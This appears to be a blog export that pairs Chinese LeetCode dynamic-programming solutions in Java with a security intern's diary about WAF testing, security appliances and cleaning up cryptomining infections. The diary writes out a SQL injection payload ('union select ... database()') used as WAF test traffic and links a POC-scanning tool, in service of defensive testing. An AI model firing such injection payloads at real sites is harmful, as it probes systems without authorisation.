<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxUncrossedLines</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">preNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            preNum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">curNum</span> <span class="operator">=</span> dp[j];<span class="comment">// curNum = dp[i-1][j]</span></span><br><span class="line">                <span class="keyword">if</span> (nums1[i - <span class="number">1</span>] == nums2[j - <span class="number">1</span>]) dp[j] = preNum + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[j] = Integer.max(dp[j], dp[j - <span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                preNum = curNum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行了波空间压缩</p>
<p>时间:99.25%</p>
<p>空间:99.07%</p>
<h3 id="1458-两个子序列的最大点积"><a href="#1458-两个子序列的最大点积" class="headerlink" title="1458. 两个子序列的最大点积"></a><a href="https://leetcode.cn/problems/max-dot-product-of-two-subsequences/">1458. 两个子序列的最大点积</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这种题一般就是子序列问题。考虑最后两个元素，如果乘起来大于0,那么肯定有dp[i][j] = dp[i-1][j-1] + x*y.但是不一定为最优情况，如下面的例子:</span><br><span class="line">A:1 100</span><br><span class="line">B:100 1</span><br><span class="line">取100 1效果最佳，所以状态转移要管dp[i-1][j] 和 dp[i][j-1]</span><br><span class="line"></span><br><span class="line">乘起来小于零同理。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDotProduct</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">prevNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">xij</span> <span class="operator">=</span> nums1[i] * nums2[j];</span><br><span class="line">                <span class="type">int</span> <span class="variable">curNum</span> <span class="operator">=</span> dp[j];</span><br><span class="line">                dp[j] = xij;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[j] = Math.max(dp[j], curNum);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[j] = Math.max(dp[j], dp[j - <span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[j] = Math.max(dp[j], prevNum + xij);</span><br><span class="line">                &#125;</span><br><span class="line">                prevNum = curNum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>时间:83.26%</p>
<p>空间:98.28%</p>
<h3 id="1092-最短公共超序列"><a href="#1092-最短公共超序列" class="headerlink" title="1092. 最短公共超序列"></a><a href="https://leetcode.cn/problems/shortest-common-supersequence/">1092. 最短公共超序列</a></h3><p>todo</p>
<h3 id="1639-通过给定词典构造目标字符串的方案数"><a href="#1639-通过给定词典构造目标字符串的方案数" class="headerlink" title="1639. 通过给定词典构造目标字符串的方案数"></a><a href="https://leetcode.cn/problems/number-of-ways-to-form-a-target-string-given-a-dictionary/">1639. 通过给定词典构造目标字符串的方案数</a></h3><p>todo</p>
<h3 id="44-通配符匹配"><a href="#44-通配符匹配" class="headerlink" title="44. 通配符匹配"></a><a href="https://leetcode.cn/problems/wildcard-matching/">44. 通配符匹配</a></h3><p>todo</p>
<h3 id="10-正则表达式匹配"><a href="#10-正则表达式匹配" class="headerlink" title="10. 正则表达式匹配"></a><a href="https://leetcode.cn/problems/regular-expression-matching/">10. 正则表达式匹配</a></h3><p>todo</p>
<h3 id="300-最长递增子序列"><a href="#300-最长递增子序列" class="headerlink" title="300. 最长递增子序列"></a><a href="https://leetcode.cn/problems/longest-increasing-subsequence/">300. 最长递增子序列</a></h3><p><a href="https://writings.sh/post/longest-increasing-subsequence-revisited">最长递增子序列（nlogn 二分法、DAG 模型 和 延伸问题） | 春水煎茶 (writings.sh)</a></p>
<p>原来这种方法还能二分？学学记录一下，我一直以为只能n^2解决</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        list.add(nums[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">changePlace</span> <span class="operator">=</span> binarySearch(list, nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(changePlace == -<span class="number">1</span>)&#123;</span><br><span class="line">                list.add(nums[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                list.set(changePlace, nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(List&lt;Integer&gt; list, <span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> list.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(num &lt;= list.get(left)) <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">if</span>(num &gt; list.get(right)) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//得到应该修改的位置 list[i]&lt;num&lt;=list[i+1]</span></span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;<span class="comment">//left&lt;=mid&lt;right</span></span><br><span class="line">            <span class="keyword">if</span>(num &gt; list.get(mid))&#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>时间：86.98%</p>
<p>空间:20.94%</p>
<p>草，变菜了，二分写了好久（主要是想省行数）</p>
<h3 id="673-最长递增子序列的个数"><a href="#673-最长递增子序列的个数" class="headerlink" title="673. 最长递增子序列的个数"></a><a href="https://leetcode.cn/problems/number-of-longest-increasing-subsequence/">673. 最长递增子序列的个数</a></h3><p>todo</p>
<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">经典模板</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findNumberOfLIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][n];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">            dp[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] &gt; nums[j]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (dp[<span class="number">0</span>][i] == dp[<span class="number">0</span>][j] + <span class="number">1</span>) &#123;</span><br><span class="line">                        dp[<span class="number">1</span>][i] += dp[<span class="number">1</span>][j];</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dp[<span class="number">0</span>][i] &lt; dp[<span class="number">0</span>][j] + <span class="number">1</span>) &#123;</span><br><span class="line">                        dp[<span class="number">0</span>][i] = dp[<span class="number">0</span>][j] + <span class="number">1</span>;</span><br><span class="line">                        dp[<span class="number">1</span>][i] = dp[<span class="number">1</span>][j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> Arrays.stream(dp[<span class="number">0</span>]).max().getAsInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">retVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[<span class="number">0</span>][i] == maxVal) retVal += dp[<span class="number">1</span>][i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>官方题解</p>
<p><a href="https://leetcode.cn/problems/number-of-longest-increasing-subsequence/solutions/1007075/zui-chang-di-zeng-zi-xu-lie-de-ge-shu-by-w12f/">673. 最长递增子序列的个数 - 力扣（LeetCode）</a></p>
<p>todo：之后深入理解方法二</p>
<h3 id="2826-将三个组排序"><a href="#2826-将三个组排序" class="headerlink" title="2826. 将三个组排序"></a><a href="https://leetcode.cn/problems/sorting-three-groups/">2826. 将三个组排序</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其实就是求得最长非递减得长度，然后在减下就行了（常规做法、懒得写代码了）</span><br><span class="line"></span><br><span class="line">但我们注意到题目有个进阶：“你可以使用 O(n) 时间复杂度以内的算法解决吗？”</span><br><span class="line">因为数字都是1、2、3那么我们应该可以根据两个点划分出1的个数、2的个数、3的个数。最后即为结果，但是这样也是n^2。根据我的经验应该有个滑动，想想怎样滑动？（不会了看题解感觉可以前缀个数组，但想不出来了）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int minimumOperations(List&lt;Integer&gt; nums) &#123;</span><br><span class="line">        int n = nums.size();</span><br><span class="line">        List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</span><br><span class="line">        list.add(nums.get(0));</span><br><span class="line">        for (int i = 1; i &lt; n; i++) &#123;</span><br><span class="line">            int left = 0;</span><br><span class="line">            int right = list.size() - 1;</span><br><span class="line">            if (nums.get(i) &gt;= list.get(right)) &#123;</span><br><span class="line">                list.add(nums.get(i));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                //leftNum&lt;= midNum &lt; rightNum</span><br><span class="line">                while (left &lt; right) &#123;</span><br><span class="line">                    int mid = left + (right - left) / 2;//left&lt;=mid&lt; right</span><br><span class="line">                    if (nums.get(i) &lt; list.get(mid)) &#123;</span><br><span class="line">                        right = mid;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        left = mid + 1;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                list.set(left, nums.get(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return n - list.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码二</p>
<p><a href="https://leetcode.cn/problems/sorting-three-groups/solutions/2396466/liang-chong-fei-bao-li-zuo-fa-liszhuang-38zac/">2826. 将三个组排序 - 力扣（LeetCode）</a></p>
<p>状态机dp之后在学todo</p>
<h3 id="最长递增子序列和最长非递减子序列分析"><a href="#最长递增子序列和最长非递减子序列分析" class="headerlink" title="最长递增子序列和最长非递减子序列分析"></a>最长递增子序列和最长非递减子序列分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主要是相同数字的处理（dp[i]表示最小的长度为i+1的子序列末尾）</span><br><span class="line"></span><br><span class="line">最长递增子序列: 1 3 7</span><br><span class="line">最长非递减子序列：1 3 7</span><br><span class="line"></span><br><span class="line">如果这时候来个3。会变成</span><br><span class="line"></span><br><span class="line">最长递增子序列: 1 3 7</span><br><span class="line">最长非递减子序列：1 3 3</span><br><span class="line"></span><br><span class="line">如果这时候再来个7</span><br><span class="line"></span><br><span class="line">最长递增子序列: 1 3 7</span><br><span class="line">最长非递减子序列：1 3 3 7</span><br><span class="line"></span><br><span class="line">如果这时候再来个3</span><br><span class="line"></span><br><span class="line">最长递增子序列: 1 3 7</span><br><span class="line">最长非递减子序列：1 3 3 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="1671-得到山形数组的最少删除次数"><a href="#1671-得到山形数组的最少删除次数" class="headerlink" title="1671. 得到山形数组的最少删除次数"></a><a href="https://leetcode.cn/problems/minimum-number-of-removals-to-make-mountain-array/">1671. 得到山形数组的最少删除次数</a></h3><p>todo</p>
<h3 id="1964-找出到每个位置为止最长的有效障碍赛跑路线"><a href="#1964-找出到每个位置为止最长的有效障碍赛跑路线" class="headerlink" title="1964. 找出到每个位置为止最长的有效障碍赛跑路线"></a><a href="https://leetcode.cn/problems/find-the-longest-valid-obstacle-course-at-each-position/">1964. 找出到每个位置为止最长的有效障碍赛跑路线</a></h3><p>todo</p>
<h3 id="2111-使数组-K-递增的最少操作次数"><a href="#2111-使数组-K-递增的最少操作次数" class="headerlink" title="2111. 使数组 K 递增的最少操作次数"></a><a href="https://leetcode.cn/problems/minimum-operations-to-make-the-array-k-increasing/">2111. 使数组 K 递增的最少操作次数</a></h3><p>todo</p>
<h3 id="1626-无矛盾的最佳球队"><a href="#1626-无矛盾的最佳球队" class="headerlink" title="1626. 无矛盾的最佳球队"></a><a href="https://leetcode.cn/problems/best-team-with-no-conflicts/">1626. 无矛盾的最佳球队</a></h3><p>todo</p>
<h3 id="1691-堆叠长方体的最大高度"><a href="#1691-堆叠长方体的最大高度" class="headerlink" title="1691. 堆叠长方体的最大高度"></a><a href="https://leetcode.cn/problems/maximum-height-by-stacking-cuboids/">1691. 堆叠长方体的最大高度</a></h3><p>todo</p>
<h3 id="960-删列造序-III"><a href="#960-删列造序-III" class="headerlink" title="960. 删列造序 III"></a><a href="https://leetcode.cn/problems/delete-columns-to-make-sorted-iii/">960. 删列造序 III</a></h3><p>todo</p>
<h3 id="2407-最长递增子序列-II"><a href="#2407-最长递增子序列-II" class="headerlink" title="2407. 最长递增子序列 II"></a><a href="https://leetcode.cn/problems/longest-increasing-subsequence-ii/">2407. 最长递增子序列 II</a></h3><p>todo</p>
<h3 id="1187-使数组严格递增"><a href="#1187-使数组严格递增" class="headerlink" title="1187. 使数组严格递增"></a><a href="https://leetcode.cn/problems/make-array-strictly-increasing/">1187. 使数组严格递增</a></h3><p>todo</p>
<h3 id="1713-得到子序列的最少操作次数"><a href="#1713-得到子序列的最少操作次数" class="headerlink" title="1713. 得到子序列的最少操作次数"></a><a href="https://leetcode.cn/problems/minimum-operations-to-make-a-subsequence/">1713. 得到子序列的最少操作次数</a></h3><p>todo</p>
<h2 id="状态机-DP"><a href="#状态机-DP" class="headerlink" title="状态机 DP"></a>状态机 DP</h2><h2 id="划分型-DP"><a href="#划分型-DP" class="headerlink" title="划分型 DP"></a>划分型 DP</h2><h2 id="其他线性-DP"><a href="#其他线性-DP" class="headerlink" title="其他线性 DP"></a>其他线性 DP</h2><h2 id="区间-DP"><a href="#区间-DP" class="headerlink" title="区间 DP"></a>区间 DP</h2><h2 id="状态压缩-DP（状压-DP）"><a href="#状态压缩-DP（状压-DP）" class="headerlink" title="状态压缩 DP（状压 DP）"></a>状态压缩 DP（状压 DP）</h2><h2 id="数位-DP"><a href="#数位-DP" class="headerlink" title="数位 DP"></a>数位 DP</h2><h2 id="数据结构优化-DP"><a href="#数据结构优化-DP" class="headerlink" title="数据结构优化 DP"></a>数据结构优化 DP</h2><h2 id="树形-DP"><a href="#树形-DP" class="headerlink" title="树形 DP"></a>树形 DP</h2><h2 id="图-DP"><a href="#图-DP" class="headerlink" title="图 DP"></a>图 DP</h2><h2 id="博弈-DP"><a href="#博弈-DP" class="headerlink" title="博弈 DP"></a>博弈 DP</h2><h2 id="概率-x2F-期望-DP"><a href="#概率-x2F-期望-DP" class="headerlink" title="概率&#x2F;期望 DP"></a>概率&#x2F;期望 DP</h2><h2 id="输出具体方案（打印方案）"><a href="#输出具体方案（打印方案）" class="headerlink" title="输出具体方案（打印方案）"></a>输出具体方案（打印方案）</h2>]]></content>
      <tags>
        <tag>coding</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>intership of momenta</title>
    <url>/2023/10/18/momenta_intership/</url>
    <content><![CDATA[<p>记录momenta 信息安全实习生做的事情</p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2023-9-29 电子科技大学网安学院拟录取，保研算是结束了。还是挺辛苦的&#x2F;(ㄒoㄒ)&#x2F;~~</p>
<p><img src="https://raw.githubusercontent.com/realikun404/p1cg0_u4e/master/imgimage-20231018213035732.png" alt="image-20231018213035732"></p>
<p>10月份国庆结束，陆陆续续投了下实习。我投的策略是测开、安全都投，因为字节有小米测开实习经历和安恒安服实习经历，所以实习找起来还相对比较顺利。</p>
<p>下面是对应的面试记录：</p>
<p><img src="https://raw.githubusercontent.com/realikun404/p1cg0_u4e/master/imgimage-20231018213250825.png" alt="image-20231018213250825"></p>
<p>值得要吐槽的是快手，在官网上10.03显示面试，但今天10.18号都没有收到任何hr的电话以及导致之前在boss上联系的其它快手测试部门都无法面试我，说必须走完正在面试的流程才能走他们的流程，巨逆天。</p>
<table>
<thead>
<tr>
<th align="center">公司</th>
<th align="center">通过</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">蘑菇车帘一面-信息安全</td>
<td align="center">√</td>
<td align="center">电话面巨水且只有一面，三天后hr加微信说约下hr面拒绝了</td>
</tr>
<tr>
<td align="center">字节一面-测开</td>
<td align="center">√</td>
<td align="center">面了一个多小时巨硬核，测试到408到linux、手撕都有，主要有四个手撕：一个sql（没做出来说没怎么学sql）、一个linux命令sed(说遇到敲命令能做)、c++手撕无重复字符的最长子串（以前做过很快写出来）、python手撕无重复字符的最长子串</td>
</tr>
<tr>
<td align="center">momenta一面-信息安全</td>
<td align="center">√</td>
<td align="center">hr打电话之前说准备好编程环境，以为这个很硬，结果并没有手撕代码。大概面了十分钟，主要是自我介绍和收一下自己的实习经历就完了，大概12分钟，以为是kpi面，结果竟然还过来，而且hr说一面面试官免评挺好，震惊了</td>
</tr>
<tr>
<td align="center">滴图-测开</td>
<td align="center">√</td>
<td align="center">加了面试官微信umeet面的，感觉难度适中。主要问了实习经历，以及测试的一些基本问题如怎样测试微信点赞之类。当然也有手撕代码，一道是冒泡排序（很快写出来了，但发现有问题后面debug发现是i–写成i++了）。以及合并有序数组，直接秒了没什么好说的，然后说怎样设置测试用例，只答了正确性测试用例，后面经提醒发现还可以测试性能安全之类的，后面也是过了并且加了ld微信越了二面</td>
</tr>
<tr>
<td align="center">货拉拉-数据安全运营实习生</td>
<td align="center">×</td>
<td align="center">先是常规自我介绍，问实习。之后以为是偏web渗透测试的，结果问了好多数据安全的，比如怎样保障公司内部的数据安全，乱扯什么hash、加密、强密码，估计问题很大。之后到今天（10-18）也没有后续，肯定挂了</td>
</tr>
<tr>
<td align="center">momenta二面-信息安全</td>
<td align="center">√</td>
<td align="center">面试先自我介绍，然后问简历包括实习，edusrc漏洞怎样挖掘的，ssrf、csrf这些比较常规的安全问题。然后后面就偏聊天，问我大学读的什么专业什么研究方向，大概面了20分钟，以为寄了，结果早上面的下午1点左右hr就打电话说过了，后面的也就没面了。挺满意这个的</td>
</tr>
<tr>
<td align="center">趋动科技一面-测开</td>
<td align="center"></td>
<td align="center">拒绝</td>
</tr>
<tr>
<td align="center">纷扬科技-测开</td>
<td align="center"></td>
<td align="center">拒绝</td>
</tr>
<tr>
<td align="center">源堡科技</td>
<td align="center"></td>
<td align="center">拒绝，惊讶的是hr竟然是学姐，聊了会天</td>
</tr>
<tr>
<td align="center">……</td>
<td align="center"></td>
<td align="center">后面的也都拒了</td>
</tr>
</tbody></table>
<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h2><h3 id="19号"><a href="#19号" class="headerlink" title="19号"></a>19号</h3><p>今天入职，体验还不错，mentor、leader都挺好、感觉很友善。</p>
<p>主要看了文档，对甲方安全有了一些了解包括甲方安全的现状、国家的一些法规、和一些设备。</p>
<p>然后主要看了云端办公的内容，主要是要做客服，应该主要回答解决别人遇到的问题包括vnc输不了密码、磁盘扩容、连接不了等问题。</p>
<h3 id="20号"><a href="#20号" class="headerlink" title="20号"></a>20号</h3><p>主要试了下公司安全设备包括绿盟RSAS（感觉界面挺丑）、奇安信天眼（beng炸弹特性奇怪、然后发现好像有IP遭了挖矿病毒，然后云了下挖矿病毒排查方法包括strace看攻击者替换二进制比如ps的一些preload劫持的dll是什么、或者使用busybox，然后试了下微步情报发现攻击IP确实是恶意IP，问了mentor说最近比较忙之后再看看）、长亭x-ray（感觉跟其它工具差不多）、深信服审计系统（只能说逆天，能看到访问招聘网站就算了连qq给谁发消息都能看到）</p>
<p>收获可能就是摸鱼学了下pwn、和学了挖矿的一些知识比如一些骚知识包括strace、busybox这些东西</p>
<p>附一些挖矿排除链接：</p>
<p><a href="https://ti.qianxin.com/uploads/2021/11/18/f4dd5058aed06883e8cb7fecf3286b1f.pdf">ti.qianxin.com&#x2F;uploads&#x2F;2021&#x2F;11&#x2F;18&#x2F;f4dd5058aed06883e8cb7fecf3286b1f.pdf</a> </p>
<p><a href="https://www.freebuf.com/articles/paper/305589.html">深度解析恶意挖矿攻击：现状、检测及处置手册 - FreeBuf网络安全行业门户</a> </p>
<p><a href="https://www.freebuf.com/articles/web/271281.html">应急响应：记一次花样贼多的挖矿病毒 - FreeBuf网络安全行业门户</a></p>
<h3 id="23日"><a href="#23日" class="headerlink" title="23日"></a>23日</h3><p>主要看了下奇安信的探针和分析平台，导师说了下公司北京和苏州的拓扑情况，明天奇安信的人来培训一下天眼的使用。、</p>
<p>附一些名词，今天初步接触的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IDC：https://www.zhihu.com/question/40534161</span><br><span class="line">aws：https://aws.amazon.com/cn/ </span><br><span class="line">VPC：https://info.support.huawei.com/info-finder/encyclopedia/zh/VPC.html</span><br><span class="line">SOC：https://zhuanlan.zhihu.com/p/654413867</span><br><span class="line">SDL：https://zhuanlan.zhihu.com/p/252325178</span><br></pre></td></tr></table></figure>

<p>然后查找poc工具，以及一些编码绕过的poc来对之后的和长亭合作的产品进行合作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc工具</span><br><span class="line">https://github.com/tr0uble-mAker/POC-bomber </span><br><span class="line">感觉还挺好用</span><br></pre></td></tr></table></figure>

<p>以及大佬文章简单看了下，对安全体系有了从0到0.000000000001的深入了解：</p>
<p>poc工具</p>
<p><a href="https://github.com/tr0uble-mAker/POC-bomber">https://github.com/tr0uble-mAker/POC-bomber</a></p>
<p>收获就是对甲方安全或者说是公司安全有了更深的了解，也脱离对安全就是渗透测试的一些浅显认识。</p>
<h3 id="24日"><a href="#24日" class="headerlink" title="24日"></a>24日</h3><p>今天早上跟着导师和长亭的讨论了waf工具的测试包括poc测试、压测、串行测试、并行测试。</p>
<p>进行poc的收集。</p>
<p>然后对甲方安全有了更深的了解，包括其体制建设、其内部的各种安全机制，看大佬文章确实对安全的认识深了很多<a href="https://www.zhihu.com/people/elknot">e1knot - 知乎 (zhihu.com)</a></p>
<p>安全不是仅仅渗透测试，渗透测试仅仅是评估安全的工具。安全更重要的是要企业内部建立起好的安全机制，好好运营。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IOC：https://blog.csdn.net/xyx112/article/details/130693588#</span><br><span class="line">SIEM：https://www.ibm.com/cn-zh/topics/siem</span><br></pre></td></tr></table></figure>

<h3 id="25日"><a href="#25日" class="headerlink" title="25日"></a>25日</h3><p>请了一天假</p>
<h3 id="26日"><a href="#26日" class="headerlink" title="26日"></a>26日</h3><p>看了长亭测试waf的压测文档，学了其测试思想。学了wrk2控制RPS测试waf看性能的对应内容，输出了压测文档，也让导师看了comment了。</p>
<p>同时也写了了poc测试计划，整理好了表格及标题，到时候直接将测试结果放在表格上即可。</p>
<p>然后其余时间就摸摸鱼看看安全公众号或者安全文档或者看看研究生导师杨老师组网站的对应PPT。</p>
<p>入职也一周了，体验目前很好，感觉人都很nice。</p>
<p>也对WAF的原理有了更深的了解，比如长亭雷池WAF原理就是反向代理，应该熟悉WAF了也能对以后绕WAF能力提升有帮助。</p>
<h3 id="27日"><a href="#27日" class="headerlink" title="27日"></a>27日</h3><p>今天主要进行poc和压测的正式测试。</p>
<p>poc测试就是输入危险payload看能不能检测到，以及输出对应表格。</p>
<p>然后是压测，遇到了一系列问题，长亭雷池先是没配https导致有些问题。后面开始压测发现雷池显示的请求数跟wrk2 RQS对不上而且返回速度很慢，经过排查发现是server服务器性能不太好，处理不了。之后就压测时请求url加了?id&#x3D;1’ union select 1,database()–+这种，这种会被waf拦截，到不了服务器，性能就正常了，就直接拦截不会到服务器，就能正常测试了。</p>
<p>对正向代理、方向代理、waf原理有了更深的理解。</p>
<h3 id="30日"><a href="#30日" class="headerlink" title="30日"></a>30日</h3><p>裂开，被挖矿了，早上10：00忙到晚上12：00</p>
<h3 id="31日"><a href="#31日" class="headerlink" title="31日"></a>31日</h3><p>当客服的一天，也顺便帮忙挖矿排查，又有其它地区被感染了</p>
<p>nnnd，网上看别人排除挖矿多轻松，这里找就巨麻烦，还有两个奇安信的人帮忙都很麻烦</p>
<p>挖矿参考：<a href="https://zhuanlan.zhihu.com/p/108688360">挖矿应急响应小结 - 知乎 (zhihu.com)</a></p>
<h2 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h2><h3 id="01日"><a href="#01日" class="headerlink" title="01日"></a>01日</h3><p>挖矿时间基本结尾，处置了没有及时清理的还有挖矿病毒的机器。学了一下iptables</p>
<h3 id="02日"><a href="#02日" class="headerlink" title="02日"></a>02日</h3><p>云端办公小客服。云端办公进行了最简单的弱口令检查，之后计划加入momenta、passwd、qwerty特征进行弱口令检查以及进行未授权访问排除。</p>
